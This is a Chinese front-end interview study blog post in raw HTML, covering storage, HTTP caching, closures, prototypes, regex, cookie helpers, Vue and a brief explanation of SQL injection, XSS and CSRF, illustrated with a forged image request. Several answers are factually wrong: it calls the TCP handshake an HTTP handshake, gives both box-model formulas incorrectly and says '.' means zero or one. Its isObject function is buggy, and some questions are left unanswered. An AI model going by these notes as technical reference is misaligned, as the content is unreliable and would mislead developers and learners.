通常可以配合cookie使用，列如当用户登录淘宝后，访问的每个页面都需要保持持续登录，服务器会创建好session，<br>  并关联的session_id通过set-cookie添加到响应头中，浏览器接收到cookie后会将其存入指定位置，当发送同源的http请求时可以自动发送cookie</p>\n<p>  localStorage  – 可以存储用户数据，可以用来存储token、userId内容，当登录成功后将获取到的token存入localStorage中，<br>  每个http请求头中添加token，这样也获得了持续验证</p>\n</li>\n<li><p>存储时间:</p>\n<p>  cookie – 设置失效时间，到达失效时间后对应的cookie将消失</p>\n<p>  sessionStorage  – 当对应的页面，标签或浏览器关闭后，sessionStorage将失效</p>\n<p>  localStorage – 永久保存，只有同源域名下才可以访问到对应的localStorage</p>\n</li>\n</ul>\n<h2 id=\"iframe特点\"><a href=\"#iframe特点\" class=\"headerlink\" title=\"iframe特点\"></a>iframe特点</h2><blockquote>\n<p>优点</p>\n</blockquote>\n<p>更加快速构成网页结构，编写导航更加便捷</p>\n<blockquote>\n<p>缺点</p>\n</blockquote>\n<p>1.多个框架构成的网页代码变得更加复杂，不容易管理从而带来不好的用户体验<br>2.网络爬虫，读取到iframe时，找不到链接，认为该网站是死网站，放弃爬取该网站内容<br>3.网站前进后退按钮只对光标所在的页面生效<br>4.使用iframe会阻塞js的onload进程<br>5.iframe中的css和js必须外链引入增加http请求，降低性能</p>\n<h2 id=\"web标准和w3c标准\"><a href=\"#web标准和w3c标准\" class=\"headerlink\" title=\"web标准和w3c标准\"></a>web标准和w3c标准</h2><blockquote>\n<p>web标准</p>\n</blockquote>\n<p>web标准是由多个标准组成的: 结构化标准，表现标准，行为标准<br>对应标准也分为:<br>    1.结构化标准指XML和XHTML<br>    2.表现标准是指css<br>    3.行为标准w3c DOM和 ECMAScript</p>\n<blockquote>\n<p>w3c标准</p>\n</blockquote>\n<p>web标准中的大部分标准都是万维网联盟制定的，但也有些标准是其他组织进行制定的列如ECMAScript</p>\n<h2 id=\"XHTML和HTML\"><a href=\"#XHTML和HTML\" class=\"headerlink\" title=\"XHTML和HTML\"></a>XHTML和HTML</h2><p>XML: 可扩展标记语言<br>HTML: 超文本链接<br>XHTML: 可扩展的超文本链接</p>\n<blockquote>\n<p>HTML</p>\n</blockquote>\n<p>网页内容标记语言，是一个标准，是网页构成的基本内容。<br>超文本的内容除了文本，还可以表示图片，音频，视频等内容。<br>它的作用是一个规范，告诉所有浏览器统一标准</p>\n<blockquote>\n<p>XML</p>\n</blockquote>\n<p>XML的表现形式上来说就是给文档加一堆标签，告诉文档对应部分的内容是什么。<br>这样做的目的是方便数据存储，传输，分享数据。也更加方便人和机器阅读<br>XML和HTML的区别是，HTML:是预定义的，再使用前就定义好了，不能凭空造一个新标签然后使用<br>而XML则不同，可以自己发明标签，也就是可扩展的意思</p>\n<blockquote>\n<p>XHTML </p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XHTML实际上就是HTML和XML的混合体，出现的原因是因为，HTML是一种语法比较松散的标记语言，语法要求也不严格。</span><br><span class=\"line\">比如:不区分大小写，单引号和双引号都可以，属性值加不加引号都可以，所谓没有规矩不成方圆</span><br><span class=\"line\">XHTML1<span class=\"number\">.0</span>是基于HTML1<span class=\"number\">.0</span>的，它没有引入任何新的标签和属性，XHTML 是更严格的HTML，它相当于HTML的子集.几乎所有能正确解析HTML的浏览器，都能兼容XHTML</span><br><span class=\"line\">XML设计用来传送及携带数据信息，不用来表现或展示数据</span><br><span class=\"line\">标签必须使用 /&gt;实现闭合例如&lt;br /&gt;而不能使用&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Doctype作用-严格模式与混杂模式如何区分？它们有何意义\"><a href=\"#Doctype作用-严格模式与混杂模式如何区分？它们有何意义\" class=\"headerlink\" title=\"Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?\"></a>Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?</h2><blockquote>\n<p>Doctype</p>\n</blockquote>\n<p>位于html标签前面，用来声明使用XML或XHTML规范</p>\n<blockquote>\n<p>严格模式</p>\n</blockquote>\n<p>所谓的严格模式是以浏览器支持的最高的w3c标准解析执行代码；</p>\n<blockquote>\n<p>混杂模式</p>\n</blockquote>\n<p>在混杂模式中，页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。</p>\n<blockquote>\n<p>何时出现对应模式</p>\n</blockquote>\n<p>浏览器使用严格模式还是混杂模式取决于，<br>html中的DTD(文档类型声明),文档中定义了标准的DTD声明，则会使网页使用对应的方法标准解析加载网页<br>忽略了文档中的DTD声明，则会采用</p>\n<h2 id=\"行内元素有哪些？块级元素有哪些？-空-void-元素有那些？行内元素和块级元素有什么区别？\"><a href=\"#行内元素有哪些？块级元素有哪些？-空-void-元素有那些？行内元素和块级元素有什么区别？\" class=\"headerlink\" title=\"行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？行内元素和块级元素有什么区别？\"></a>行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？行内元素和块级元素有什么区别？</h2><blockquote>\n<p>行内元素</p>\n</blockquote>\n<p>b,img,font,textarea,input,label,button,select,em,i,span,</p>\n<blockquote>\n<p>块元素</p>\n</blockquote>\n<p>div,p,section,header,table,tbody,tfoot,h1-h6,iframe,option,ul,li,ol,dl，address,tr,hr,br</p>\n<h2 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h2><blockquote>\n<p>什么是闭包</p>\n</blockquote>\n<p>闭包其实就是可以读取其他函数变量的函数，这种引用的产生导致，变量将常驻内存导致无法释放</p>\n<blockquote>\n<p>如何使用闭包</p>\n</blockquote>\n<p>编写一个函数a，函数a里面有一个函数b，函数b里面引用了函数a内的变量</p>\n<blockquote>\n<p>闭包带来的优点和缺点</p>\n</blockquote>\n<p>在javascript中并没有私有变量这个概念，可以通过闭包来实现私有变量和私有方法，减少全局污染<br>使用闭包会造成变量常驻内存，使用不当容易造成内存泄漏，解决方法在函数退出前，将不适用的局部变量删除</p>\n<h2 id=\"作用域链\"><a href=\"#作用域链\" class=\"headerlink\" title=\"作用域链\"></a>作用域链</h2><blockquote>\n<p>什么是作用域链</p>\n</blockquote>\n<p>作用域链是执行环境中函数和变量的可访问性是有序的，变量的访问权限是一直向上查找的，一直查找到windows停止。作用域向下访问时不允许的<br>简单的说作用域链就是函数和变量的可访问范围，即作用域链控制着函数和变量的生命周期和可访问性</p>\n<h2 id=\"原型链\"><a href=\"#原型链\" class=\"headerlink\" title=\"原型链\"></a>原型链</h2><blockquote>\n<p>前言</p>\n</blockquote>\n<p>javascript中函数也是一个对象</p>\n<blockquote>\n<p>原型链prototype</p>\n</blockquote>\n<p>javascript中的函数可以当做构造函数使用，约定构造函数的首字母大写，使用new生成一个实例对象<br>每个函数再生成时都会附带一些原有属性，每个函数都有一个prototype属性指向这个函数的原型，原型里面自带<strong>proto</strong>属性和constructor<br>另外原型里面可以定义方法，在生成的实例对象中可以使用prototype定义的方法，生成的实例对象在调用方法时，首先会在自身上查找是否有该方法，<br>没有方法时会到构造函数的原型上查找，没有查找到通过<strong>proto</strong>向更上层的原型对象查找是否有该方法，直至找到Function.prototype。</p>\n<p>如果需要实现继承，将要继承的函数的原型的proto等于继承函数的实例，因为继承函数的实例里面有<strong>proto</strong>可以查找到继承函数的原型，就可以使用继承函数的方法和变量了</p>\n<p>生成的实例对象中含有<strong>proto</strong>这个属性，proto属性指向生成这个构造函数的原型，通过constructor可以找到这个实例对象的构造函数</p>\n<p>而通过这个构造函数生成的实例对象会生成一个<strong>proto</strong>属性，这个属性指向它构造函数的prototype</p>\n<h2 id=\"有赞\"><a href=\"#有赞\" class=\"headerlink\" title=\"有赞\"></a>有赞</h2><blockquote>\n<p>为什么要离开现在公司</p>\n</blockquote>\n<p>公司的技术氛围不是很好，在公司发展受限</p>\n<blockquote>\n<p>常见算法时间复杂度，排序算法的时间复杂度</p>\n</blockquote>\n<p>O(n^2)</p>\n<blockquote>\n<p>position 有哪些属性，定位时根据什么进行定位</p>\n</blockquote>\n<p>属性:<br>    static<br>    relative<br>    absolute<br>    fixed</p>\n<p>设置了static后，left和top不起作用<br>设置relative，left和top的偏移将会以自身当前位置做偏移<br>absolute，一直向上查询找到设置了属性为relative，absolute，fixed的父元素<br>fixed以窗口为基准进行偏移</p>\n<blockquote>\n<p>如何解决微信定位不准的问题</p>\n</blockquote>\n<p>使用wx.getLocation获取到当前经纬度，使用wx.request向腾讯的地图接口发送请求获取当前地址信息</p>\n<blockquote>\n<p>http三次握手</p>\n</blockquote>\n<p>白话翻译:<br>client-&gt; server 我要发送http请求了<br>server-client 可以你发吧<br>client-&gt; server 好，那我发送了</p>\n<blockquote>\n<p>js数据类型，及如何判断</p>\n</blockquote>\n<p>数据类型:<br>    boolean，object，string，null，undefined，number，symbol</p>\n<p>typeof boolean  &gt; boolean<br>typeof object   &gt; object<br>typeof array    &gt; object<br>typeof function &gt; functioin<br>typeof null     &gt; object<br>typeof number   &gt; number<br>typeof undefined &gt; undefined</p>\n<p>判断一个是否为对象时</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isObject</span>(<span class=\"params\">item</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> type = <span class=\"keyword\">typeof</span> item;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> type ===<span class=\"string\">'object'</span>||type===<span class=\"string\">'function'</span>&amp;&amp;item!==<span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>判断其是否是dom对象</p>\n</blockquote>\n<p>dom.nodeType ===1,是dom对象</p>\n<blockquote>\n<p>小程序如何实现分享</p>\n</blockquote>\n<p>在js文件中定义onshareAppmessage，可以设置图片路径，标题，打开的页面路径<br>不设置图片和标题使用，图片使用当前页面截图，标题使用当前页面标题，或者首页标题，</p>\n<h2 id=\"HTTP\"><a href=\"#HTTP\" class=\"headerlink\" title=\"HTTP\"></a>HTTP</h2><blockquote>\n<p>常用的http方法</p>\n</blockquote>\n<p>get,post,head,put,delete,options,trace,connect，link</p>\n<p>get获取远程资源<br>post传输实体<br>head获取请求头<br>put获取文件<br>delete删除远程服务器文件<br>connect与与远程服务器保持连接<br>options检测远程服务器是否支持指定类型的方法</p>\n<blockquote>\n<p>get与post文件区别</p>\n</blockquote>\n<p>浏览器会主动缓存get的请求，<br>get相对于post而言，post更加安全，因为get已明文的方式显示在地址栏上，而post放在request body中，抓包情况下一样<br>post使用request body进行传输，所以支持更多的数据传输长度，并且支持更多种数据类型，而浏览器的url长度有限</p>\n<blockquote>\n<p>http状态</p>\n</blockquote>\n<p>http是无状态的，不存储状态，使用http1.1开始自动建立持续连接</p>\n<h2 id=\"html5新特性\"><a href=\"#html5新特性\" class=\"headerlink\" title=\"html5新特性\"></a>html5新特性</h2><blockquote>\n<p>新增标签:</p>\n</blockquote>\n<p>语义化标签:<br>article，section，aside，header，footer</p>\n<p>新特性标签:<br>video，canvas，audio，css3新动画特效</p>\n<blockquote>\n<p>去除的标签:</p>\n</blockquote>\n<p>basefont,u,tt,s,font</p>\n<blockquote>\n<p>css3特性</p>\n</blockquote>\n<p>1.选择器的扩展，属性选择器，后代选择器<br>2.边框，背景<br>3.渐变，阴影<br>4.盒模型</p>\n<blockquote>\n<p>标准盒模型，怪异盒模型</p>\n</blockquote>\n<p>标准盒模型的块宽度等于padding+margin+border+width<br>怪异盒模型的块宽度等于margin+width</p>\n<h2 id=\"闭包-1\"><a href=\"#闭包-1\" class=\"headerlink\" title=\"闭包\"></a>闭包</h2><p>闭包是什么？为什么产生闭包？闭包的作用？</p>\n<blockquote>\n<p>什么是闭包</p>\n</blockquote>\n<p>在了解闭包之前我们先来讲解一下作用域链，假设我们声明了一个函数b，b函数中包含一个函数a，而a函数中console.log(s);如果当前作用域没有s变量，则会向上一个作用域寻找s变量.假设函数b中有声明变量s，这个时候就形成了闭包<br>当我们在函数b中声明了变量s，并且return了函数a，这个时候函数a形成了闭包</p>\n<blockquote>\n<p>为什么会产生闭包</p>\n</blockquote>\n<p>根据垃圾回收机制，如果一个变量的引用不为0，那么这个变量就不会被释放，当这个变量一直不会释放就会一直存储在内存中，从而形成了我们所知的闭包。当将函数内部的函数返回出来，并且将返回的函数存入一个全局变量，那么这个全局变量不会被释放，所有内部的变量也不会被释放，变量将会一直保存在变量中</p>\n<blockquote>\n<p>闭包的作用</p>\n</blockquote>\n<p>在javascript中可以直接读取全局的变量，但是一个函数中不可以读取其他函数的变量。而闭包正好实现了一个变量读取其他函数的变量，闭包形成私有变量，减少全局变量的污染</p>\n<h2 id=\"预加载\"><a href=\"#预加载\" class=\"headerlink\" title=\"预加载\"></a>预加载</h2><blockquote>\n<p>preload的作用</p>\n</blockquote>\n<p>1.不阻塞渲染和document的onload事件<br>2.提前加载指定资源，不会出现字体半天才出现的情况</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;link rel=<span class=\"string\">\"preload\"</span> href=<span class=\"string\">\"style.css\"</span> <span class=\"keyword\">as</span>=<span class=\"string\">\"style\"</span>&gt;</span><br><span class=\"line\">&lt;link rel=<span class=\"string\">\"preload\"</span> href=<span class=\"string\">\"main.js\"</span> <span class=\"keyword\">as</span>=<span class=\"string\">\"script\"</span>&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"http缓存\"><a href=\"#http缓存\" class=\"headerlink\" title=\"http缓存\"></a>http缓存</h2><h3 id=\"http缓存的介绍\"><a href=\"#http缓存的介绍\" class=\"headerlink\" title=\"http缓存的介绍\"></a>http缓存的介绍</h3><blockquote>\n<p>为什么有http缓存，什么时候出现作用是什么</p>\n</blockquote>\n<p>http缓存也可以理解成客户端缓存，相当于客户端有个本地数据库，可以用于存储图片，js，这些常见的静态文件，分成强制缓存和协商缓存</p>\n<blockquote>\n<p>强制缓存</p>\n</blockquote>\n<p>当设置http请求头中设置了缓存类型为强制缓存时，会将资源缓存入本地，当再次发送请求获取这些资源的时候，会直接读取缓存在本地的这些数据，当本地数据库没有这些文件的时候才会从服务端读取</p>\n<blockquote>\n<p>协商缓存</p>\n</blockquote>\n<p>协商缓存又可以称之为对比缓存，客户端会首先从缓存数据库获取一个标识，得到标识后向服务端验证缓存的资源是否新鲜，如果该资源还是新鲜的资源，服务端会返回304，这时客户端会从本地读取缓存数据</p>\n<blockquote>\n<p>浏览器是如何判断本地缓存资源是否新鲜</p>\n</blockquote>\n<p>在客户端与服务端进行交互的时候会发送http请求，http请求是由请求头和请求体构成，在请求头中有cache-control中附带缓存信息，时间等数据信息，客户端可以根据这个来判断是否是新鲜数据</p>\n<h3 id=\"如何使用缓存技术\"><a href=\"#如何使用缓存技术\" class=\"headerlink\" title=\"如何使用缓存技术\"></a>如何使用缓存技术</h3><blockquote>\n<p>如何使用强制缓存</p>\n</blockquote>\n<p>对于强制缓存服务端会使用两个字段来表明，expires和cache-control</p>\n<p>expires:</p>\n<p>expires的值为服务端返回的数据到期时间，当再次请求时的请求时间小于expires的时间，客户端则直接使用缓存的数据，但由于服务端和客户端的时间可能有时间差，所以一般使用cache-control代替</p>\n<p>cache-control:</p>\n<p>cache-control有很多属性分别表示不同的缓存策略</p>\n<p>private:    客户端可以缓存<br>public:        客户端和服务端都可以缓存<br>max-age=t    表明资源会在多少秒之后失效<br>no-cache:    表明使用协商缓存<br>no-store:    不使用缓存</p>\n<blockquote>\n<p>协商缓存</p>\n</blockquote>\n<p>协商缓存需要对比是否使用缓存，在客户端第一次向服务端发起请求的时候，服务端会向客户端发送缓存标识和缓存数据，客户端会将缓存数据存入本地，再次请求时客户端会将缓存标识发给服务端，当服务端会验证这个标识是否新鲜，当该资源新鲜时直接返回，304状态这时客户端会直接使用缓存文件，当资源不够新鲜时，服务端会直接发送最新的数据过来</p>\n<p>Last-ModifiedLast-Modified:服务器在响应请求时，会告诉浏览器资源的最后修改时间。<br>if-Modified-Since:浏览器再次请求服务器的时候，请求头会包含此字段，后面跟着在缓存中获得的最后修改时间。服务端收到此请求头发现有if-Modified-Since，则与被请求资源的最后修改时间进行对比，如果一致则返回304和响应报文头，浏览器只需要从缓存中获取信息即可。从字面上看，就是说:从某个时间节点算起，是否文件被修改了</p>\n<p>如果真的被修改:那么开始传输响应一个整体，服务器返回:200 OK<br>如果没有被修改:那么只需传输响应header，服务器返回:304 Not Modified</p>\n<p>if-Unmodified-Since:从字面上看, 就是说: 从某个时间点算起, 是否文件没有被修改</p>\n<p>如果没有被修改:则开始`继续’传送文件: 服务器返回: 200 OK<br>如果文件被修改:则不传输,服务器返回: 412 Precondition failed (预处理错误)</p>\n<p>这两个的区别是一个是修改了才下载一个是没修改才下载。Last-Modified 说好却也不是特别好，因为如果在服务器上，一个资源被修改了，但其实际内容根本没发生改变，会因为Last-Modified时间匹配不上而返回了整个实体给客户端（即使客户端缓存里有个一模一样的资源）。为了解决这个问题，HTTP1.1推出了Etag。</p>\n<h3 id=\"如何禁止浏览器缓存input框的输入内容\"><a href=\"#如何禁止浏览器缓存input框的输入内容\" class=\"headerlink\" title=\"如何禁止浏览器缓存input框的输入内容\"></a>如何禁止浏览器缓存input框的输入内容</h3><p>input框有autocomplete属性，有on和off值，默认为on，设置为off即可</p>\n<h3 id=\"input框的属性\"><a href=\"#input框的属性\" class=\"headerlink\" title=\"input框的属性\"></a>input框的属性</h3><blockquote>\n<p>所有方法有</p>\n</blockquote>\n<p>image,radio,hidden,checkbox,password,reset,submit,text,button</p>\n<h3 id=\"数组中有哪些方法\"><a href=\"#数组中有哪些方法\" class=\"headerlink\" title=\"数组中有哪些方法\"></a>数组中有哪些方法</h3><blockquote>\n<p>会修改原数组的方法</p>\n</blockquote>\n<p>splice,sort,push,pop,shift,unshift,reverse,</p>\n<blockquote>\n<p>不会修改原数组的方法</p>\n</blockquote>\n<p>forEach,filter,some,every,map,reduce,join,slice,indexOf</p>\n<blockquote>\n<p>数组中的如何中断</p>\n</blockquote>\n<p>数组中的方法都不可以中断，return也无效。只有some和every为return false的时候会中断</p>\n<h3 id=\"如何检测css动画如何终止\"><a href=\"#如何检测css动画如何终止\" class=\"headerlink\" title=\"如何检测css动画如何终止\"></a>如何检测css动画如何终止</h3><blockquote>\n<p>通过事件监听transitionend，是否执行来判断是否执行结束</p>\n</blockquote>\n<p>el.addEventListener(‘transitionend’,function(){<br>    console.log(‘css动画结束’)<br>    // todo<br>})</p>\n<h3 id=\"vue-router如何实现的\"><a href=\"#vue-router如何实现的\" class=\"headerlink\" title=\"vue-router如何实现的\"></a>vue-router如何实现的</h3><p>前端路由是直接找到与地址匹配的一个组件或对象并将其渲染出来。改变浏览器地址而不向服务器发出请求有两种方式: </p>\n<ol>\n<li>在地址中加入#以欺骗浏览器，地址的改变是由于正在进行页内导航 </li>\n<li>使用H5的window.history功能，使用URL的Hash来模拟一个完整的URL。</li>\n</ol>\n<p>当打包构建应用时，Javascript 包会变得非常大，影响页面加载。如果我们能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应组件，这样就更加高效了。</p>\n<h3 id=\"http的常见方法\"><a href=\"#http的常见方法\" class=\"headerlink\" title=\"http的常见方法\"></a>http的常见方法</h3><blockquote>\n<p>前面已经描述</p>\n</blockquote>\n<h3 id=\"正则表达式空格怎么表示\"><a href=\"#正则表达式空格怎么表示\" class=\"headerlink\" title=\"正则表达式空格怎么表示\"></a>正则表达式空格怎么表示</h3><blockquote>\n<p>特殊字符</p>\n</blockquote>\n<p>^,$,.,*,+,{},[]</p>\n<blockquote>\n<p>正则修饰</p>\n</blockquote>\n<p>i: 不区分大小写<br>g: 全局匹配</p>\n<blockquote>\n<p>量词</p>\n</blockquote>\n<p>.:一个或零个<br>+:一个或多个<br>*:零个或多个<br>{1,}一个或多个<br>{1,6}一个到六个</p>\n<blockquote>\n<p>字符类</p>\n</blockquote>\n<p>\\w:匹配单词字符，包括字母数字下划线<br>\\s:匹配空格<br>\\d:匹配数字<br>\\t:匹配制表符<br>\\r:匹配回车符<br>\\n:匹配换行符</p>\n<p>字符类大写后，表示相反</p>\n<blockquote>\n<p>字符串上的方法</p>\n</blockquote>\n<p>match:将匹配的内容当做数组返回，没有则返回null<br>replace: 接收两个参数，第一个正则，第二个替换成的内容，将匹配到的内容全部替换<br>search: 如果找到对应内容返回索引，否则返回-1</p>\n<blockquote>\n<p>正则上的方法</p>\n</blockquote>\n<p>test: 如何匹配到了返回true否则返回false<br>exec: 将第一次匹配到的内容和子匹配到的内容放入数组中</p>\n<h3 id=\"cookie的操作，如何设置cookie的目录\"><a href=\"#cookie的操作，如何设置cookie的目录\" class=\"headerlink\" title=\"cookie的操作，如何设置cookie的目录\"></a>cookie的操作，如何设置cookie的目录</h3><blockquote>\n<p>读取cookie</p>\n</blockquote>\n<p>document.cookie可以获取到cookie的值</p>\n<blockquote>\n<p>读取不太友好，需要自己封装，可以配合正则使用</p>\n</blockquote>\n<p>get: function (name){<br>        var cookieName = encodeURIComponent(name) + “=”,<br>            cookieStart = document.cookie.indexOf(cookieName),<br>            cookieValue = null;<br>        if (cookieStart &gt; -1){<br>            var cookieEnd = document.cookie.indexOf(“;”, cookieStart);<br>            if (cookieEnd == -1){<br>                cookieEnd = document.cookie.length;<br>            }<br>            cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd));<br>    }<br>        return cookieValue;<br>}</p>\n<blockquote>\n<p>写入</p>\n</blockquote>\n<p>set: function (name, value, expires, path, domain, secure) {<br>    var cookieText = encodeURIComponent(name) + “=” +<br>                        encodeURIComponent(value);<br>    if (expires instanceof Date) {<br>        cookieText += “; expires=” + expires.toGMTString();<br>    }<br>    if (path) {<br>        cookieText += “; path=” + path;<br>    }<br>    if (domain) {<br>        cookieText += “; domain=” + domain;<br>    }<br>    if (secure) {<br>        cookieText += “; secure”;<br>    }<br>    document.cookie = cookieText;<br>}</p>\n<blockquote>\n<p>删除cookie</p>\n</blockquote>\n<p>unset: function (name, path, domain, secure){<br>    this.set(name, “”, new Date(0), path, domain, secure);<br>}</p>\n<blockquote>\n<p>cookie安全</p>\n</blockquote>\n<p>HttpOnly=true   // 只能在发送http时携带，无法通过js读取到cookie<br>cookie被设置了Secure=true，那么这个cookie只能用https协议发送给服务器，用http协议是不发送的</p>\n<h3 id=\"svg有用过吗，canvas如何使用\"><a href=\"#svg有用过吗，canvas如何使用\" class=\"headerlink\" title=\"svg有用过吗，canvas如何使用\"></a>svg有用过吗，canvas如何使用</h3><p>svg创建的是矢量图，使用xml构建，xml扩展描述语言出现比较早，内置rect，circle，line，等标签主要用于描述二维。每个图形都是dom节点可以绑定事件或用于修改<br>canvas画布，输出的是整个画布，就像一张图片一样放大会出现锯齿</p>\n<h3 id=\"vue的双向绑定原理是怎么样的\"><a href=\"#vue的双向绑定原理是怎么样的\" class=\"headerlink\" title=\"vue的双向绑定原理是怎么样的\"></a>vue的双向绑定原理是怎么样的</h3><p>数据劫持(observer)=&gt;订阅者(watcher)=&gt;指令模板(complite)</p>\n<h3 id=\"你是怎么学习的\"><a href=\"#你是怎么学习的\" class=\"headerlink\" title=\"你是怎么学习的\"></a>你是怎么学习的</h3><p>前期会看一下视频，后期主要是通过mdn系统学习api，在知乎掘金等社区发现好玩高效的特性，看源码</p>\n<h3 id=\"transition有哪些属性，可以设置什么。同理去学习一下animation\"><a href=\"#transition有哪些属性，可以设置什么。同理去学习一下animation\" class=\"headerlink\" title=\"transition有哪些属性，可以设置什么。同理去学习一下animation\"></a>transition有哪些属性，可以设置什么。同理去学习一下animation</h3><blockquote>\n<p>transition</p>\n</blockquote>\n<p>transition: property duration timing-function delay;</p>\n<blockquote>\n<p>transform</p>\n</blockquote>\n<p>transform: none|transform-functions;<br>none | matrix(n,n,n,n,n,n) | translate(x,y) | translate3d(x,y,z) | translateX(x) | translateY(y)</p>\n<h3 id=\"常见的网络安全问题，如何解决sql注入，xss攻击，CSRF的防御\"><a href=\"#常见的网络安全问题，如何解决sql注入，xss攻击，CSRF的防御\" class=\"headerlink\" title=\"常见的网络安全问题，如何解决sql注入，xss攻击，CSRF的防御\"></a>常见的网络安全问题，如何解决sql注入，xss攻击，CSRF的防御</h3><blockquote>\n<p>sql </p>\n</blockquote>\n<p>在提交表单时，里面输入sql语句，如果服务器端是使用sql拼接方式。则数据库可能遭到恶意修改</p>\n<blockquote>\n<p>xss</p>\n</blockquote>\n<p>将html标签或javascript注入到网页中，可以获取到用户的cookie，获增加恶意表单，用户提交时会将信息发送到攻击者的服务器上</p>\n<p>在用户输入的地方要检测&lt;&gt;之类的标签</p>\n<blockquote>\n<p>csrf</p>\n</blockquote>\n<p>跨站伪造请求，原理很简单，假设我在论坛上发布了一篇文章，文章有一张图片，scr=”<a href=\"http://www.cnblogs.com/mvc/Follow/FollowBlogger.aspx?blogUserGuid=4e8c33d0-77fe-df11-ac81-842b2b196315&quot;,当你打开这篇文章的时候，src为自动发送http请求，并携带你的token。\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/mvc/Follow/FollowBlogger.aspx?blogUserGuid=4e8c33d0-77fe-df11-ac81-842b2b196315&quot;,当你打开这篇文章的时候，src为自动发送http请求，并携带你的token。</a></p>\n<p>我在我的文章中放了一个连接指向我的一个网站，我在网站内嵌入了iframe，在网页加载的时候我就使用iframe发送http请求，这个时候你的token就会自动添加到http中并进行发送，但由于同源策略这样是加载不出来的，新建一个页面用户存放iframe，当前页面src嵌入iframe</p>\n<h3 id=\"promise状态有哪些，有哪些方法。所有promise执行完了之后有个finally方法\"><a href=\"#promise状态有哪些，有哪些方法。所有promise执行完了之后有个finally方法\" class=\"headerlink\" title=\"promise状态有哪些，有哪些方法。所有promise执行完了之后有个finally方法\"></a>promise状态有哪些，有哪些方法。所有promise执行完了之后有个finally方法</h3><blockquote>\n<p>状态<br>peding</p>\n</blockquote>\n<h3 id=\"vue的生命周期有哪些，分别做了什么\"><a href=\"#vue的生命周期有哪些，分别做了什么\" class=\"headerlink\" title=\"vue的生命周期有哪些，分别做了什么\"></a>vue的生命周期有哪些，分别做了什么</h3><h3 id=\"h5的离线存储\"><a href=\"#h5的离线存储\" class=\"headerlink\" title=\"h5的离线存储\"></a>h5的离线存储</h3><h3 id=\"如何防止使用js在浏览器中获取到cookie\"><a href=\"#如何防止使用js在浏览器中获取到cookie\" class=\"headerlink\" title=\"如何防止使用js在浏览器中获取到cookie\"></a>如何防止使用js在浏览器中获取到cookie</h3><p>设置httpOnly=true,document.cookie = “”</p>\n<h3 id=\"jsonp的跨域原理\"><a href=\"#jsonp的跨域原理\" class=\"headerlink\" title=\"jsonp的跨域原理\"></a>jsonp的跨域原理</h3><h3 id=\"input如何禁止浏览器缓存用户的登录信息\"><a href=\"#input如何禁止浏览器缓存用户的登录信息\" class=\"headerlink\" title=\"input如何禁止浏览器缓存用户的登录信息\"></a>input如何禁止浏览器缓存用户的登录信息</h3><p>autocomplete = false</p>\n<h3 id=\"es6中如何实现双向绑定\"><a href=\"#es6中如何实现双向绑定\" class=\"headerlink\" title=\"es6中如何实现双向绑定\"></a>es6中如何实现双向绑定</h3><p>proxy代理实现，与Object.definedProperty不同，可以检测数组变化</p>\n<h3 id=\"箭头函数和普通函数有什么区别\"><a href=\"#箭头函数和普通函数有什么区别\" class=\"headerlink\" title=\"箭头函数和普通函数有什么区别\"></a>箭头函数和普通函数有什么区别</h3><p>1.箭头函数作为匿名函数,是不能作为构造函数的,不能使用new<br>2.箭头函数不绑定arguments,取而代之用rest参数…解决<br>3.箭头函数会捕获其所在上下文的 this 值，作为自己的 this 值<br>4.箭头函数当方法使用的时候没有定义this绑定<br>5.箭头函数没有原型属性<br>6.箭头函数不能当做Generator函数,不能使用yield关键字<br>7.箭头函数不能换行<br>8.箭头函数的this永远指向其上下文的 this，任何方法都改变不了其指向，如call(), bind(), apply()<br>普通函数的this指向调用它的那个对象</p>\n<h3 id=\"事件委托是如何实现的\"><a href=\"#事件委托是如何实现的\" class=\"headerlink\" title=\"事件委托是如何实现的\"></a>事件委托是如何实现的</h3><p>在事件冒泡阶段，将事件代理到父元素上，通过currentTarget和target来查看触发元素的关系，通过这种方式来减少js，提高性能</p>\n<h3 id=\"移动端的点击穿透是为什么\"><a href=\"#移动端的点击穿透是为什么\" class=\"headerlink\" title=\"移动端的点击穿透是为什么\"></a>移动端的点击穿透是为什么</h3><p>一般出现这种状况是click和touch事件混用出现的，因为click默认有200毫秒的延迟，而toucch事件没有延迟在弹窗消失后依然会触发click事件，导致底层元素点击事件触发</p>\n<h3 id=\"box-sizing有哪些属性，那些元素是默认border-box的\"><a href=\"#box-sizing有哪些属性，那些元素是默认border-box的\" class=\"headerlink\" title=\"box-sizing有哪些属性，那些元素是默认border-box的\"></a>box-sizing有哪些属性，那些元素是默认border-box的</h3><p>content-box，可以通过这个元素将其设置成标准盒模型，和怪异盒模型</p>\n<h3 id=\"background-clip属性和background-origin属性\"><a href=\"#background-clip属性和background-origin属性\" class=\"headerlink\" title=\"background-clip属性和background-origin属性\"></a>background-clip属性和background-origin属性</h3><p>background-clip是用于设置，背景图从什么位置开始显示的，border-box、content-box、padding-box<br>background-origin指定background-position以什么位置作为标点进行定位</p>\n<h3 